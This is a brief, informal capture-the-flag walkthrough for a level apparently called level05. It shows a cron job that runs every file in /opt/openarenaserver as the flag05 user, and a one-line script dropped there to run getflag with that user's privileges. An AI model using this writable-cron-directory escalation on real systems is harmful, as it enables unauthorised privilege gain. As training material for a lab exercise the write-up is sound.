after u use user level05 you have a new mail contain 
cat /var/spool/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
that's mean we launch this script every 2min
the script is 
`#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done`
we create a script in /opt/openarenaserver/*  and wait 2min and u ll get the flag
echo "getflag > /tmp/res" > /opt/openarenaserver/tt.sh